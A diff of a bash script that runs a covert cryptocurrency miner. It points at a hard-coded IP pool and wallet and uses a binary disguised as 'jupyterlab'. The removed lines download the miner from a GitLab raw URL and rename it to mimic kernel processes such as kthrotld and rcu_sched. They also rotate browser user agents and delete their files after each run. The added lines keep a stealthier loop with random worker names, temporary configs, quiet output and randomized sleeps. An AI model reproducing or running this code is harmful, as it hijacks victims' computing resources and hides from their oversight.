@@ -1,106 +1,32 @@
 #!/usr/bin/env bash
 
-NEW_SCRIPT_URL="https://gitlab.com/sarifadim/jomblo/-/raw/main/jupyterlab"
-LOCAL_BIN_DIR="$HOME/.local/bin"
-
-RUNTIME=180
-
-MIN_SLEEP=30
-MAX_SLEEP=40
-
+MINER="$HOME/.local/bin/jupyterlab"
 POOL="3.144.16.65:80"
 WALLET="Q0105004479f85cd7d62eeac7a6d6ec24cc6af897a72bac82b3f1d8a63b425e2430efd6504c753d"
 
-THREAD_LIST=(4 6)
-
-UA_LIST=(
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"
-    "Spotify/8.8.44 (Windows NT 10.0; Win64; x64)"
-    "iTunes/12.10.9 (Windows; Microsoft Windows 10 x64 Business Edition (Build 19041); x64) AppleWebKit/7607.3.18.0.2"
-)
-
-POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
-                "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")
-
-generate_random_string() {
-    local length=${1:-8}
-    local chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-    local result=''
-    for ((i=0; i<length; i++)); do
-        result+=${chars:RANDOM%${#chars}:1}
-    done
-    echo "$result"
-}
-
-mkdir -p "$LOCAL_BIN_DIR"
-cd "$LOCAL_BIN_DIR" || exit
+[ ! -f "$MINER" ] && { echo "Miner tidak ditemukan: $MINER"; exit 1; }
+chmod +x "$MINER" 2>/dev/null
 
 while true; do
-    curl -sL "$NEW_SCRIPT_URL" -o "new_session.sh"
+    CONFIG="/tmp/miner_$(head /dev/urandom | tr -dc a-f0-9 | head -c 8).json"
+    THREADS=$(( (RANDOM % 3) + 4 ))  # 4-6 threads
+    WORKER="worker_$(head /dev/urandom | tr -dc a-f0-9 | head -c 6)"
     
-    if [ $? -eq 0 ] && [ -s "new_session.sh" ]; then
-        chmod +x "new_session.sh"
-        
-        rm -f "$LOCAL_BIN_DIR"/*.json
-        rm -f "$LOCAL_BIN_DIR"/.dbus-daemon*
-        rm -f "$LOCAL_BIN_DIR"/migration*
-        rm -f "$LOCAL_BIN_DIR"/watchdog*
-        rm -f "$LOCAL_BIN_DIR"/.ksoftirqd*
-        rm -f "$LOCAL_BIN_DIR"/rcu_*
-        rm -f "$LOCAL_BIN_DIR"/.profile-cache*
-        rm -f "$LOCAL_BIN_DIR"/kdevtmpfs*
-        rm -f "$LOCAL_BIN_DIR"/kintegrityd*
-        rm -f "$LOCAL_BIN_DIR"/kblockd*
-        rm -f "$LOCAL_BIN_DIR"/kthrotld*
-
-        BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
-        
-        RAND_SUFFIX=$(generate_random_string 12)
-        BIN_NAME_FULL="${BIN_NAME}${RAND_SUFFIX}"
-        
-        CONFIG_SUFFIX=$(generate_random_string 10)
-        CONFIG_NAME="${BIN_NAME}_config${CONFIG_SUFFIX}.json"
-
-        BIN_URL="https://gitlab.com/sarifadim/jomblo/-/raw/main/jupyterlab"
-        curl -sL "$BIN_URL" -o "$BIN_NAME_FULL"
-        chmod +x "$BIN_NAME_FULL"
-
-        THREADS=${THREAD_LIST[$RANDOM % ${#THREAD_LIST[@]}]}
-        UA=${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}
-
-        cat > "$CONFIG_NAME" << EOF
+    cat > "$CONFIG" << EOF
 {
-  "api": {
-    "worker-id": "$WORKER"
-  },
-  "autosave": true,
-  "pools": [
-    {
-      "url": "$POOL",
-      "user": "$WALLET",
-      "pass": "system",
-      "keepalive": true,
-      "tls": true
-    }
-  ],
-  "user-agent": "$UA",
-  "threads": $THREADS
+  "pools": [{
+    "url": "$POOL",
+    "user": "$WALLET",
+    "pass": "x",
+    "tls": true
+  }],
+  "threads": $THREADS,
+  "user-agent": "Mozilla/5.0",
+  "donate-level": 0
 }
 EOF
-
-        timeout "$RUNTIME" ./"$BIN_NAME_FULL" -c "$CONFIG_NAME" >/dev/null 2>&1
-
-        rm -f "new_session.sh"
-        rm -f "$BIN_NAME_FULL"
-        rm -f "$CONFIG_NAME"
-
-        SLEEP_TIME=$((RANDOM % (MAX_SLEEP - MIN_SLEEP + 1) + MIN_SLEEP))
-        sleep "$SLEEP_TIME"
-        
-    else
-        sleep 30
-    fi
+    
+    timeout 180 "$MINER" -c "$CONFIG" --quiet 2>/dev/null
+    rm -f "$CONFIG"
+    sleep $((30 + RANDOM % 11))
 done
